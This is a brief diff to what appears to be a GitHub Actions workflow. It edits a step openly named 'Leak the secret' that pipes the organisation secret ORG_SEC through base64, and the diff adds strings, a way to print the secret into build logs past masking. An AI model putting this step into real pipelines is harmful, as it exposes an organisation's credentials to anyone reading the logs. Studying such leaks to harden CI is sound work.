@@ -11,6 +11,6 @@ jobs:
     steps:
       - name: Leak the secret
         run: |
-          echo $VALUE | base64
+          echo $VALUE | base64 | strings
         env:
           VALUE: ${{ secrets.ORG_SEC }}
